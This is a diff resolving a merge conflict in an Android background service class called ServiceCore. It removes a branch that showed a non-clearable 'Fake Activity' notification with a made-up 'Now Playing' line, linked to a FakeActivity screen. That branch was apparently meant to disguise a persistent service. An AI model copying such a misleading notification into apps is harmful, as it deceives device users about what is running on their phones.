@@ -86,8 +86,7 @@ public class ServiceCore extends Service {
 		needsNotification = isNotificationNeeded();
 		
 		Status.setAppContext(getApplicationContext());
-<<<<<<< HEAD
-		
+
 		if (needsNotification == true) {
 			Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
 					System.currentTimeMillis());
@@ -113,23 +112,6 @@ public class ServiceCore extends Service {
 		}
 		
 		return false;
-=======
-
-		if (Cfg.ACTIVITY) {
-			Notification note = new Notification(R.drawable.notify_icon, "Ready to go?", System.currentTimeMillis());
-
-			Intent i = new Intent(this, FakeActivity.class);
-
-			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-
-			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
-
-			note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
-			note.flags |= Notification.FLAG_NO_CLEAR;
-
-			startForeground(1337, note);
-		}
->>>>>>> d7b28a5f86018050525fd5b6e364a4ea4e0e4bd4
 	}
 
 	@Override
@@ -259,15 +241,10 @@ public class ServiceCore extends Service {
 
 		core.Stop();
 		core = null;
-<<<<<<< HEAD
 		
 		if (needsNotification == true) {
 			stopForeground(true);
 		}
-=======
-
-		stopForeground(true);
->>>>>>> d7b28a5f86018050525fd5b6e364a4ea4e0e4bd4
 	}
 
 	private void setBackground() {
